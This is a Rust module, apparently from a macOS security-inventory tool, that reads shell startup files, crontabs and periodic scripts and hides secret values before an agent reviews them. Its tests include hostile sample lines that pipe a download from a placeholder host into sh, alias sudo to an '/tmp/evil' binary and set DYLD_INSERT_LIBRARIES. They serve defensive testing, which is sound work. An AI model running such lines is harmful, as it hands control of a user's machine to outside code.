//! Files that run commands without a launch item: the shells' startup files, crontabs, and
//! `periodic`'s scripts.
//!
//! Each file goes to the agent as its lines, with the literal value of every variable
//! assignment hidden ([`redact`]): these files often hold tokens (`export GITHUB_TOKEN=...`),
//! and the bundle is kept with each sweep's history (owner's decision, 2026-11-18, over a
//! path-and-hash listing the agent would open itself, and over whole files). `PATH`, `FPATH`
//! and `DYLD_` values are shown, as for launch items, and so is a value built from a command
//! (`$(...)`, backticks), which is what runs. A token passed on a command line
//! (`gh auth login --with-token abc`) is not an assignment and is shown.
//!
//! What is read, under [`super::system_root`] for the system's files:
//!
//! - zsh's and bash's startup files in the home folder and in `/etc` (with Terminal's
//!   `/etc/zshrc_Apple_Terminal`, which `/etc/zshrc` sources), and the lists of folders
//!   `path_helper` puts on every login shell's `PATH`, root's included: `/etc/paths` and
//!   `/etc/paths.d`. `ZDOTDIR` is not followed: zsh then reads the user's files from another
//!   folder, which is not listed.
//! - this user's crontab, through `crontab -l` (the tabs folder is root's alone; other users'
//!   and root's crontabs are not read), and `/etc/crontab`.
//! - the scripts in `periodic`'s `daily`, `weekly` and `monthly` folders under `/etc/periodic`
//!   and `/usr/local/etc/periodic`, which root runs. macOS 27.2 has neither `periodic` nor
//!   the folders, so this reads only older systems.
//!
//! A file that is a link is read through it: dotfile managers (stow, Home Manager) link the
//! home folder's files, and nix-darwin links `/etc/zshrc`. A FIFO is still refused, so a
//! planted one cannot block the sweep.

use std::fs;
use std::io;
use std::io::Read as _;
use std::os::unix::fs::OpenOptionsExt as _;
use std::path::Path;
use std::path::PathBuf;

use serde::Serialize;
use serde_json::json;

use crate::cancel::Cancel;
use crate::inventory::command;
use crate::inventory::host::account::Account;
use crate::inventory::host::shows_value;
use crate::inventory::host::stamp;

/// The largest file read. Arbitrary: a long `.zshrc` is a few kB, and the limit keeps a planted
/// file from being copied whole into every bundle.
const FILE_LIMIT: usize = 256 * 1024;

/// The startup files zsh and bash read in the home folder, per zsh(1) and bash(1).
const HOME_SHELL_FILES: [&str; 10] = [
    ".zshenv",
    ".zprofile",
    ".zshrc",
    ".zlogin",
    ".zlogout",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".bashrc",
    ".bash_logout",
];

/// The startup files zsh and bash read for every user, under the system root.
const SYSTEM_SHELL_FILES: [&str; 8] = [
    "etc/zshenv",
    "etc/zprofile",
    "etc/zshrc",
    "etc/zshrc_Apple_Terminal",
    "etc/zlogin",
    "etc/zlogout",
    "etc/profile",
    "etc/bashrc",
];

/// `periodic`'s folders of scripts, under the system root.
const PERIODIC_FOLDERS: [&str; 6] = [
    "etc/periodic/daily",
    "etc/periodic/weekly",
    "etc/periodic/monthly",
    "usr/local/etc/periodic/daily",
    "usr/local/etc/periodic/weekly",
    "usr/local/etc/periodic/monthly",
];

/// What kind of file runs, which says who it runs as.
#[derive(Debug, Clone, Copy, Serialize)]
#[serde(rename_all = "snake_case")]
pub(super) enum FileKind {
    /// A shell's startup file: the home folder's run as this user, `/etc`'s as every user who
    /// starts that shell, root included.
    ShellStartup,
    /// A crontab: this user's runs as this user, `/etc/crontab` as the users it names.
    Crontab,
    /// A script `periodic` runs as root.
    PeriodicScript,
    /// A list of folders `path_helper` puts on `PATH` in every login shell, root's included:
    /// `/etc/paths` and the files in `/etc/paths.d`.
    PathList,
}

/// One file, as the agent reads it.
#[derive(Debug, Serialize)]
pub(super) struct StartupFile {
    /// Its path, which an issue names. This user's crontab is named by where cron keeps it.
    pub(super) path: String,
    kind: FileKind,
    /// Why it could not be read; `lines` is then empty.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// Its lines, values hidden as the module docs say.
    lines: Vec<String>,
    /// Whether only the first [`FILE_LIMIT`] bytes were read.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    truncated: bool,
    /// For a truncated file, its size and modification time, which key it with its lines: a
    /// change past the limit would otherwise leave the key, and a dismissal, as they were.
    #[serde(skip)]
    stamp: Option<String>,
    /// For a file that runs as root, whether this user could replace it
    /// ([`Account::can_replace`]).
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    replaceable: bool,
}

impl StartupFile {
    /// A file, or a folder of them, that could not be read, with why.
    fn unread(kind: FileKind, path: &Path, error: String, root_run: Option<&Account>) -> Self {
        Self {
            path: path.to_string_lossy().into_owned(),
            kind,
            error: Some(error),
            lines: Vec::new(),
            truncated: false,
            stamp: None,
            replaceable: root_run.is_some_and(|account| account.can_replace(path)),
        }
    }

    /// What keys an issue about it: its shown lines, so changing a hidden token does not show a
    /// dismissed issue again, and whether it could be replaced. Any other edit shows it again,
    /// an installer's added lines included: what the agent judged has changed. JSON, so no two
    /// files join into the same text.
    pub(super) fn identity(&self) -> String {
        json!({
            "lines": self.lines,
            "error": self.error,
            "replaceable": self.replaceable,
            "stamp": self.stamp,
        })
        .to_string()
    }
}

/// Reads every file the module docs list. `account` is who the sweep runs as, `None` when it
/// is not known; then this user's crontab is not read and no file is marked replaceable.
pub(super) fn collect(
    root: &Path,
    home: Option<&Path>,
    account: Option<&Account>,
    cancel: &Cancel,
) -> Vec<StartupFile> {
    let mut files = Vec::new();
    let home_files = home
        .into_iter()
        .flat_map(|home| HOME_SHELL_FILES.map(|f| home.join(f)));
    for path in home_files {
        files.extend(read(FileKind::ShellStartup, &path, None));
    }
    for name in SYSTEM_SHELL_FILES {
        files.extend(read(FileKind::ShellStartup, &root.join(name), account));
    }
    files.extend(read(FileKind::PathList, &root.join("etc/paths"), account));
    files.extend(listed(
        FileKind::PathList,
        &root.join("etc/paths.d"),
        account,
    ));
    if let Some(account) = account {
        files.extend(user_crontab(root, account, cancel));
    }
    files.extend(read(FileKind::Crontab, &root.join("etc/crontab"), account));
    for folder in PERIODIC_FOLDERS {
        files.extend(listed(
            FileKind::PeriodicScript,
            &root.join(folder),
            account,
        ));
    }
    files
}

/// Each file in `folder` but hidden ones, sorted. A folder that is not there has none; one that
/// cannot be listed is itself a file with the error, so the agent is told what was not read.
fn listed(kind: FileKind, folder: &Path, root_run: Option<&Account>) -> Vec<StartupFile> {
    let entries = match fs::read_dir(folder) {
        Ok(entries) => entries,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Vec::new(),
        Err(e) => {
            let error = format!("cannot list it: {e}");
            return vec![StartupFile::unread(kind, folder, error, root_run)];
        }
    };
    let mut paths: Vec<PathBuf> = Vec::new();
    let mut files = Vec::new();
    for entry in entries {
        match entry {
            Ok(entry) if entry.file_name().to_string_lossy().starts_with('.') => {}
            Ok(entry) => paths.push(entry.path()),
            Err(e) => {
                let error = format!("cannot list all of it: {e}");
                files.push(StartupFile::unread(kind, folder, error, root_run));
            }
        }
    }
    paths.sort();
    files.extend(paths.iter().filter_map(|path| read(kind, path, root_run)));
    files
}

/// The file at `path`, `None` when it is not there. `root_run` is the account to check
/// replaceability against, for a file that runs as root.
fn read(kind: FileKind, path: &Path, root_run: Option<&Account>) -> Option<StartupFile> {
    match read_following(path) {
        Ok(bytes) => {
            let truncated = bytes.len() > FILE_LIMIT;
            let shown = &bytes[..bytes.len().min(FILE_LIMIT)];
            Some(StartupFile {
                path: path.to_string_lossy().into_owned(),
                kind,
                error: None,
                lines: lines(&String::from_utf8_lossy(shown)),
                truncated,
                stamp: truncated
                    .then(|| fs::metadata(path).ok().map(|meta| stamp(&meta)))
                    .flatten(),
                replaceable: root_run.is_some_and(|account| account.can_replace(path)),
            })
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => None,
        Err(e) => {
            let error = match e.kind() {
                io::ErrorKind::InvalidInput => "not a regular file (a folder or a FIFO)".to_owned(),
                _ => format!("cannot read it: {e}"),
            };
            Some(StartupFile::unread(kind, path, error, root_run))
        }
    }
}

/// Up to one byte past [`FILE_LIMIT`] of the regular file at `path`, through any link (see
/// the module docs). `O_NONBLOCK` makes opening a FIFO return at once, and the open file's own
/// metadata then refuses it, so a swap between a check and the open cannot slip one in, as in
/// [`crate::paths::open_regular`], which refuses links too.
fn read_following(path: &Path) -> io::Result<Vec<u8>> {
    let file = fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NONBLOCK)
        .open(path)?;
    if !file.metadata()?.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "not a regular file",
        ));
    }
    let mut bytes = Vec::new();
    file.take(FILE_LIMIT as u64 + 1).read_to_end(&mut bytes)?;
    Ok(bytes)
}

/// This user's crontab, from `crontab -l` under the system root (so a test's root has none).
/// `None` when the user has none or the tool is not there; a run that fails otherwise is the
/// file with its error.
fn user_crontab(root: &Path, account: &Account, cancel: &Cancel) -> Option<StartupFile> {
    let tool = root.join("usr/bin/crontab");
    let path = format!("/usr/lib/cron/tabs/{}", account.name);
    let file = |error, lines| StartupFile {
        path: path.clone(),
        kind: FileKind::Crontab,
        error,
        lines,
        truncated: false,
        stamp: None,
        replaceable: false,
    };
    match command::run_any_status(&tool.to_string_lossy(), &["-l"], cancel) {
        Ok(None) => None,
        Ok(Some(output)) if output.success => Some(file(None, lines(&output.stdout))),
        // What crontab(1) says, and exits 1 with, when the user has no crontab.
        Ok(Some(output)) if output.stderr.starts_with("crontab: no crontab for") => None,
        Ok(Some(output)) => Some(file(Some(output.detail), Vec::new())),
        Err(e) => Some(file(Some(e.to_string()), Vec::new())),
    }
}

/// What replaces a hidden value.
const HIDDEN: &str = "(hidden)";

/// The lines of `text`, values hidden ([`redact`]). A value whose quote or parenthesis is not
/// closed on its line hides the following lines too, up to the one that closes it: a key
/// pasted between quotes spans many.
fn lines(text: &str) -> Vec<String> {
    let mut open = None;
    text.lines().map(|line| redact(line, &mut open)).collect()
}

/// `line` with the literal part of every assigned value replaced by `(hidden)`, wherever the
/// assignment is: after `;`, `&&` or `then`, inside quotes (`alias gh='GH_TOKEN=x gh'`), in a
/// comment, or in a here-document (`//registry.npmjs.org/:_authToken=x`). An assignment is a
/// name at a word boundary followed by `=` or `+=` ([`assignment_at`]), and `launchctl setenv
/// NAME value`. A value of `PATH`, `FPATH` or a `DYLD_` variable is shown whole; in any other,
/// each command it runs (`$(...)`, backticks, `<(...)`) is shown and the text around them is
/// hidden. Over-hiding costs the agent a little context; a value shown cannot be taken back.
///
/// `open` carries a quote or parenthesis left open by a hidden value on an earlier line.
///
/// Not hidden: a value passed as an argument (`--token=x` after a dash, `gh auth login
/// --with-token x`), and one written to a file (`echo x > ~/.token`).
fn redact(line: &str, open: &mut Option<u8>) -> String {
    let mut out = String::with_capacity(line.len());
    let mut rest = line;
    if let Some(close) = *open {
        let Some(at) = rest.find(char::from(close)) else {
            return HIDDEN.to_owned();
        };
        out.push_str(HIDDEN);
        rest = &rest[at..];
        *open = None;
    }
    let mut at = 0;
    let mut copied = 0;
    while at < rest.len() {
        let Some((name, value_start)) = assignment_at(rest, at) else {
            at += rest[at..].chars().next().map_or(1, char::len_utf8);
            continue;
        };
        let (end, unclosed) = value_end(&rest[value_start..]);
        let value = &rest[value_start..value_start + end];
        out.push_str(&rest[copied..value_start]);
        let shown = shown_value(name, value);
        if shown != value {
            *open = unclosed;
        }
        out.push_str(&shown);
        at = value_start + end;
        copied = at;
    }
    out.push_str(&rest[copied..]);
    out
}

/// The name and where its value starts, when an assignment starts at byte `at` of `text`: a
/// name (`[A-Za-z_][A-Za-z0-9_]*`) at a word boundary, then `=` (not `==`) or `+=`. At the
/// start of a line, spaces may surround the `=`, as crontab(5) allows. Also `launchctl setenv
/// NAME value`. A boundary is the start of the line or any character that cannot continue a
/// name or an option: not a letter, digit, `_`, `-`, `$` or `.`.
fn assignment_at(text: &str, at: usize) -> Option<(&str, usize)> {
    let bytes = text.as_bytes();
    let before = at.checked_sub(1).map(|b| bytes[b]);
    if before.is_some_and(|b| b.is_ascii_alphanumeric() || b"_-$.".contains(&b)) {
        return None;
    }
    // An alias's definition is a command, which the agent judges; an assignment inside its
    // quotes is still found as the scan goes on.
    if text[..at].trim_end().ends_with("alias") {
        return None;
    }
    if let Some(after) = text[at..].strip_prefix("launchctl") {
        let mut words = after.split_whitespace();
        if words.next() == Some("setenv") {
            let name = words.next()?;
            let name_at = at + "launchctl".len() + after.find(name)?;
            let value_at = name_at + name.len();
            let space = text[value_at..].len() - text[value_at..].trim_start().len();
            return Some((&text[name_at..value_at], value_at + space));
        }
    }
    let name_len = text[at..]
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(text.len() - at);
    let name = &text[at..at + name_len];
    if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
        return None;
    }
    let mut after = &text[at + name_len..];
    // A subscript (`secrets[github]=x`, zsh and bash arrays) belongs to the name.
    if let Some(subscript) = after.strip_prefix('[') {
        after = &subscript[subscript.find(']')? + 1..];
    }
    let line_start = text[..at].trim().is_empty();
    if line_start {
        after = after.trim_start();
    }
    let operator = ["+=", "="].into_iter().find(|op| after.starts_with(op))?;
    if after[operator.len()..].starts_with('=') {
        return None;
    }
    let mut value = &after[operator.len()..];
    if line_start {
        value = value.trim_start();
    }
    Some((name, text.len() - value.len()))
}

/// The value as the bundle shows it (see [`redact`]).
fn shown_value(name: &str, value: &str) -> String {
    if value.is_empty() || shows_value(name) || name == "FPATH" {
        return value.to_owned();
    }
    let mut shown = String::new();
    let mut literal = false;
    let mut at = 0;
    while at < value.len() {
        let command = command_end(&value[at..]);
        if command > 0 {
            shown.push_str(&value[at..at + command]);
            literal = false;
            at += command;
            continue;
        }
        if !literal {
            shown.push_str(HIDDEN);
            literal = true;
        }
        at += value[at..].chars().next().map_or(1, char::len_utf8);
    }
    shown
}

/// The length of the command `text` starts with (`$(...)`, `<(...)` or a backquoted one), or 0.
fn command_end(text: &str) -> usize {
    if text.starts_with("$(") || text.starts_with("<(") {
        return 1 + group_end(&text[1..]).0;
    }
    if let Some(inner) = text.strip_prefix('`') {
        return inner.find('`').map_or(text.len(), |at| at + 2);
    }
    0
}

/// Where the parenthesised group `text` starts with ends, past its `)`, nested ones included,
/// and whether it was left open (so it ran to the end).
fn group_end(text: &str) -> (usize, bool) {
    let mut depth = 0_usize;
    for (at, byte) in text.bytes().enumerate() {
        match byte {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return (at + 1, false);
                }
            }
            _ => {}
        }
    }
    (text.len(), true)
}

/// Where the shell word `text` starts with ends: at unquoted white space or a control
/// character (`;`, `&`, `|`, `<`, `>`, `)`). A word that starts with `(` is the group it opens
/// (an array), and a `$(...)` or backquoted command inside the word is part of it. Also which
/// quote or parenthesis was left open at the end of the line, if one was.
fn value_end(text: &str) -> (usize, Option<u8>) {
    if text.starts_with('(') {
        let (end, unclosed) = group_end(text);
        return (end, unclosed.then_some(b')'));
    }
    let bytes = text.as_bytes();
    // Past the character at `from`, which keeps every index on a character boundary.
    let next = |from: usize| from + text[from..].chars().next().map_or(1, char::len_utf8);
    let mut at = 0;
    while at < bytes.len() {
        if matches!(bytes[at], b'$' | b'`') {
            let command = command_end(&text[at..]);
            if command > 0 {
                at += command;
                continue;
            }
        }
        at = match bytes[at] {
            // The escaped character, which `next` steps past, at the end of the line too.
            b'\\' => next(at + 1),
            quote @ (b'\'' | b'"') => match text[at + 1..].find(char::from(quote)) {
                Some(close) => at + close + 2,
                None => return (text.len(), Some(quote)),
            },
            b' ' | b'\t' | b';' | b'&' | b'|' | b'<' | b'>' | b'(' | b')' => break,
            _ => next(at),
        };
    }
    (at.min(text.len()), None)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn one(line: &str) -> String {
        redact(line, &mut None)
    }

    #[test]
    fn literal_values_are_hidden_and_what_runs_is_shown() {
        let cases = [
            (
                "export GITHUB_TOKEN=ghp_abc123",
                "export GITHUB_TOKEN=(hidden)",
            ),
            ("  TOKEN=\"a b c\" make", "  TOKEN=(hidden) make"),
            ("export A='x y' B=2", "export A=(hidden) B=(hidden)"),
            (
                "typeset -x KEY=v1; echo hi",
                "typeset -x KEY=(hidden); echo hi",
            ),
            (
                "export PATH=\"/tmp/bin:$PATH\"",
                "export PATH=\"/tmp/bin:$PATH\"",
            ),
            ("FPATH=/x:$FPATH", "FPATH=/x:$FPATH"),
            (
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
            ),
            (
                "export X=$(curl -s https://e.x | sh)",
                "export X=$(curl -s https://e.x | sh)",
            ),
            ("X=`id`", "X=`id`"),
            (
                "export X=$(echo $(id)) Y=z",
                "export X=$(echo $(id)) Y=(hidden)",
            ),
            (
                "export AUTH=\"Bearer s $(date)\"",
                "export AUTH=(hidden)$(date)(hidden)",
            ),
            ("PATH+=:/opt", "PATH+=:/opt"),
            ("A+=secret", "A+=(hidden)"),
            ("EMPTY=", "EMPTY="),
            ("X=a\\ b c", "X=(hidden) c"),
            (
                "alias sudo='sudo -E /tmp/evil'",
                "alias sudo='sudo -E /tmp/evil'",
            ),
            (
                "curl -fsSL https://e.x/i.sh | sh",
                "curl -fsSL https://e.x/i.sh | sh",
            ),
            (
                "gh auth login --with-token abc",
                "gh auth login --with-token abc",
            ),
            ("run --token=abc", "run --token=abc"),
            ("exporter=1", "exporter=(hidden)"),
            ("export", "export"),
            ("1A=x", "1A=x"),
            (
                "[[ $X == y ]] && [ \"$a\" = b ]",
                "[[ $X == y ]] && [ \"$a\" = b ]",
            ),
            ("echo ${X:=d}", "echo ${X:=d}"),
            ("*/5 * * * * /tmp/x.sh", "*/5 * * * * /tmp/x.sh"),
            ("MAILTO=me@example.com", "MAILTO=(hidden)"),
        ];
        for (line, shown) in cases {
            assert_eq!(one(line), shown, "{line}");
        }
    }

    #[test]
    fn an_assignment_anywhere_on_a_line_is_hidden() {
        let cases = [
            // Found leaking by the reviews of PR #75.
            (
                "export A=a; export B=s",
                "export A=(hidden); export B=(hidden)",
            ),
            (
                "[ -n \"$CI\" ] || export T=s",
                "[ -n \"$CI\" ] || export T=(hidden)",
            ),
            (
                "if [ x ]; then export T=s; fi",
                "if [ x ]; then export T=(hidden); fi",
            ),
            (
                "alias gh='GH_TOKEN=s gh'",
                "alias gh='GH_TOKEN=(hidden) gh'",
            ),
            (
                "gh() { GH_TOKEN=s command gh \"$@\"; }",
                "gh() { GH_TOKEN=(hidden) command gh \"$@\"; }",
            ),
            ("env TOKEN=s cmd", "env TOKEN=(hidden) cmd"),
            (
                "0 * * * * GITHUB_TOKEN=s /usr/local/bin/b",
                "0 * * * * GITHUB_TOKEN=(hidden) /usr/local/bin/b",
            ),
            ("# export OLD_TOKEN=s", "# export OLD_TOKEN=(hidden)"),
            ("KEYS=(s1 s2)", "KEYS=(hidden)"),
            ("typeset -A s=(gh s12)", "typeset -A s=(hidden)"),
            (
                "export AA=x>/dev/null Z=s",
                "export AA=(hidden)>/dev/null Z=(hidden)",
            ),
            (
                "//registry.npmjs.org/:_authToken=npm_s",
                "//registry.npmjs.org/:_authToken=(hidden)",
            ),
            ("export \"TOKEN=s\"", "export \"TOKEN=(hidden)"),
            (
                "launchctl setenv TOKEN s",
                "launchctl setenv TOKEN (hidden)",
            ),
            ("TOKEN = s", "TOKEN = (hidden)"),
            (
                "https://x.example/?token=s&b=2",
                "https://x.example/?token=(hidden)&b=(hidden)",
            ),
            ("secrets[github]=s", "secrets[github]=(hidden)"),
            ("X=`date`; A=s", "X=`date`; A=(hidden)"),
            ("X=a\\", "X=(hidden)"),
            (
                "CONFIG='{\"q\":\"$(whoami)\"}'",
                "CONFIG=(hidden)$(whoami)(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(one(line), shown, "{line}");
        }
    }

    #[test]
    fn a_value_left_open_hides_the_lines_up_to_its_close() {
        let text =
            "export KEY=\"-----BEGIN KEY-----\nAAAAsecret\n-----END-----\" && echo ok\nnext=1\n";
        assert_eq!(
            lines(text),
            [
                "export KEY=(hidden)",
                "(hidden)",
                "(hidden)\" && echo ok",
                "next=(hidden)"
            ]
        );
        let array = "KEYS=(\n  s1\n  s2\n)\necho done\n";
        assert_eq!(
            lines(array),
            [
                "KEYS=(hidden)",
                "(hidden)",
                "(hidden)",
                "(hidden))",
                "echo done"
            ]
        );
        // A shown value left open hides nothing after it.
        assert_eq!(lines("PATH=\"/a\nb=1\n"), ["PATH=\"/a", "b=(hidden)"]);
    }

    proptest::proptest! {
        #[test]
        fn redact_takes_any_line(line in ".*") {
            let _ = lines(&line);
        }

        #[test]
        fn a_literal_value_never_reaches_the_bundle(
            prefix in proptest::sample::select(vec![
                "", "  ", "export ", "typeset -x ", "x; ", "a && ", "b || ", "then ", "# ",
                "alias a='", "f() { ", "env ", "0 * * * * ", "echo \"", "//h/:", "launchctl setenv ",
            ]),
            name in "[A-Z_][A-Z0-9_]{0,8}",
            secret in "[a-z0-9]{12,20}",
            quote in proptest::sample::select(vec!["", "'", "\""]),
            suffix in proptest::sample::select(vec!["", " cmd", "; echo", " && x", "'", "\""]),
        ) {
            proptest::prop_assume!(name != "PATH" && name != "FPATH" && !name.starts_with("DYLD_"));
            let line = if prefix == "launchctl setenv " {
                format!("{prefix}{name} {quote}{secret}{quote}{suffix}")
            } else {
                format!("{prefix}{name}={quote}{secret}{quote}{suffix}")
            };
            let shown = lines(&format!("{line}\nnext\n")).join("\n");
            proptest::prop_assert!(!shown.contains(&secret), "{line} -> {shown}");
        }
    }

    /// Each file as `kind path`, with `tmp` cut from its path, then its lines or its error.
    fn shown(files: &[StartupFile], tmp: &Path) -> Vec<String> {
        files
            .iter()
            .map(|f| {
                let kind = serde_json::to_value(f.kind).unwrap();
                let path = f.path.replace(&*tmp.to_string_lossy(), "");
                let body = f.error.clone().unwrap_or_else(|| f.lines.join(" / "));
                format!("{} {path}: {body}", kind.as_str().unwrap())
            })
            .collect()
    }

    #[test]
    fn files_are_read_where_the_shells_cron_and_periodic_look() {
        use std::os::unix::fs::PermissionsExt as _;

        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let root = tmp.path().join("root");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(root.join("etc/periodic/daily")).unwrap();
        fs::create_dir_all(root.join("etc/paths.d")).unwrap();
        // A dotfile manager's link is read through.
        let dotfiles = tmp.path().join("dotfiles");
        fs::create_dir(&dotfiles).unwrap();
        fs::write(dotfiles.join("zshrc"), "export TOKEN=abc\ncurl x | sh\n").unwrap();
        std::os::unix::fs::symlink(dotfiles.join("zshrc"), home.join(".zshrc")).unwrap();
        fs::write(home.join(".bashrc"), "").unwrap();
        fs::write(root.join("etc/zshrc"), "setopt X\n").unwrap();
        fs::write(root.join("etc/paths"), "/usr/bin\n").unwrap();
        fs::write(root.join("etc/paths.d/10-tool"), "/opt/tool/bin\n").unwrap();
        fs::write(root.join("etc/crontab"), "* * * * * root /tmp/a\n").unwrap();
        fs::write(root.join("etc/periodic/daily/500.evil"), "#!/bin/sh\n").unwrap();
        fs::write(root.join("etc/periodic/daily/.hidden"), "").unwrap();
        fs::create_dir(root.join("etc/profile")).unwrap();
        let locked = root.join("etc/periodic/weekly");
        fs::create_dir(&locked).unwrap();
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();

        let files = collect(&root, Some(&home), None, &Cancel::new());
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o755)).unwrap();
        assert_eq!(
            shown(&files, tmp.path()),
            [
                "shell_startup /home/.zshrc: export TOKEN=(hidden) / curl x | sh",
                "shell_startup /home/.bashrc: ",
                "shell_startup /root/etc/zshrc: setopt X",
                "shell_startup /root/etc/profile: not a regular file (a folder or a FIFO)",
                "path_list /root/etc/paths: /usr/bin",
                "path_list /root/etc/paths.d/10-tool: /opt/tool/bin",
                "crontab /root/etc/crontab: * * * * * root /tmp/a",
                "periodic_script /root/etc/periodic/daily/500.evil: #!/bin/sh",
                "periodic_script /root/etc/periodic/weekly: cannot list it: Permission denied \
                 (os error 13)",
            ]
        );
        assert!(files.iter().all(|f| !f.replaceable), "no account given");
    }

    #[test]
    fn a_fifo_is_refused_without_blocking() {
        let tmp = tempfile::tempdir().unwrap();
        let fifo = tmp.path().join(".zshrc");
        crate::paths::releasing_fifo(&fifo);
        let file = read(FileKind::ShellStartup, &fifo, None).unwrap();
        assert_eq!(
            file.error.as_deref(),
            Some("not a regular file (a folder or a FIFO)")
        );
    }

    #[test]
    fn this_user_s_crontab_comes_from_the_tool() {
        use std::os::unix::fs::PermissionsExt as _;

        let account = Account::current(&Cancel::new()).unwrap().unwrap();
        let tmp = tempfile::tempdir().unwrap();
        let tool = tmp.path().join("usr/bin/crontab");
        fs::create_dir_all(tool.parent().unwrap()).unwrap();
        let crontab = |script: &str| {
            fs::write(&tool, format!("#!/bin/sh\n{script}\n")).unwrap();
            fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).unwrap();
            user_crontab(tmp.path(), &account, &Cancel::new())
        };

        let listed = crontab("echo 'TOKEN=s'; echo '@reboot /tmp/x'").unwrap();
        assert_eq!(listed.path, format!("/usr/lib/cron/tabs/{}", account.name));
        assert_eq!(listed.lines, ["TOKEN=(hidden)", "@reboot /tmp/x"]);
        let none = format!(
            "echo 'crontab: no crontab for {}' >&2; exit 1",
            account.name
        );
        assert!(crontab(&none).is_none(), "no crontab is no file");
        let failed = crontab("echo 'crontab: tmp/tmp.1: Permission denied' >&2; exit 1").unwrap();
        assert_eq!(failed.lines, Vec::<String>::new());
        assert!(failed.error.unwrap().contains("Permission denied"));
        fs::remove_file(&tool).unwrap();
        assert!(
            user_crontab(tmp.path(), &account, &Cancel::new()).is_none(),
            "no tool"
        );
    }

    #[test]
    fn a_file_over_the_limit_is_read_up_to_it() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(".zshrc");
        let limit = FILE_LIMIT;
        fs::write(&path, "a\n".repeat(limit / 2)).unwrap();
        let at_limit = read(FileKind::ShellStartup, &path, None).unwrap();
        assert!(!at_limit.truncated);
        assert_eq!(at_limit.lines.len(), limit / 2);
        fs::write(&path, "a\n".repeat(limit / 2) + "b\n").unwrap();
        let over = read(FileKind::ShellStartup, &path, None).unwrap();
        assert!(over.truncated);
        assert_eq!(
            over.lines.len(),
            limit / 2,
            "the line past the limit is left out"
        );
    }

    #[test]
    fn a_hidden_value_does_not_change_the_identity() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(".zshrc");
        let identity = |text: &str| {
            fs::write(&path, text).unwrap();
            read(FileKind::ShellStartup, &path, None)
                .unwrap()
                .identity()
        };
        let first = identity("export TOKEN=one\n");
        assert_eq!(identity("export TOKEN=two\n"), first, "a new token");
        assert_ne!(
            identity("export TOKEN=two\ncurl x | sh\n"),
            first,
            "a new command"
        );

        // Past the limit, only the stamp shows a change.
        let long = "a\n".repeat(FILE_LIMIT / 2);
        let before = identity(&format!("{long}x\n"));
        assert_ne!(identity(&format!("{long}curl x | sh\n")), before);
    }
}
